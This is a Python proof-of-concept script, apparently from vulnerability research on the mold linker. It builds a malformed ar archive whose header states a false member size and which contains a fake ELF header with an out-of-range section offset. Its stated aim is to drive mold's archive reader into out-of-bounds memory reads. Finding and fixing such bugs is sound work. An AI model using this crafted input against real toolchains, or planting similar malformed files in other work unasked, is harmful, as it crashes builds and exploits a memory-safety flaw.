#!/usr/bin/env python3
"""Writes a malformed Unix ".a" (fat) archive with one member whose ar_size header field lies
about its own size: the header claims 5,000,000 bytes, but only a 64-byte fake ELF header
actually follows in the file. mold's read_fat_archive_members() passes that lied size straight
into MappedFile::slice() with no validation, producing a MappedFile whose declared `.size` is
5,000,000 even though the real mmap'd region backing it is far smaller. Every downstream
mf->size-based bounds check (including the ones fixed in candidates 001/002 of this workspace)
then treats an offset that is actually far outside the real mapping as "in range", and
dereferencing it faults.

The embedded 64-byte payload is a minimal x86_64 ET_REL ELF header whose e_shoff is a large,
attacker-chosen offset (3,000,000) that is "in bounds" per the archive's LIE but genuinely
unmapped memory in reality.
"""
import struct
import sys


def ar_header(name: str, size: int) -> bytes:
    name = name.ljust(16)[:16]
    date = b"0".ljust(12)
    uid = b"0".ljust(6)
    gid = b"0".ljust(6)
    mode = b"0".ljust(8)
    sz = str(size).ljust(10)
    fmag = b"`\n"
    h = name.encode() + date + uid + gid + mode + sz.encode() + fmag
    assert len(h) == 60
    return h


def make_fake_ehdr(e_shoff: int) -> bytes:
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8  # ELFCLASS64, ELFDATA2LSB
    assert len(e_ident) == 16
    rest = struct.pack(
        "<HHIQQQIHHHHHH",
        1,        # e_type = ET_REL
        62,       # e_machine = EM_X86_64
        1,        # e_version
        0,        # e_entry
        0,        # e_phoff
        e_shoff,  # e_shoff - the attacker-controlled "in the lie's bounds" offset
        0,        # e_flags
        64,       # e_ehsize
        0,        # e_phentsize
        0,        # e_phnum
        64,       # e_shentsize
        1,        # e_shnum
        0,        # e_shstrndx
    )
    ehdr = e_ident + rest
    assert len(ehdr) == 64
    return ehdr


def main() -> None:
    out_path = sys.argv[1] if len(sys.argv) > 1 else "evil.a"
    ehdr = make_fake_ehdr(e_shoff=3_000_000)

    out = b"!<arch>\n"
    out += ar_header("a.o", 5_000_000)  # LIE: real bytes below are only 64
    out += ehdr
    if len(out) % 2:
        out += b"\n"

    with open(out_path, "wb") as f:
        f.write(out)


if __name__ == "__main__":
    main()
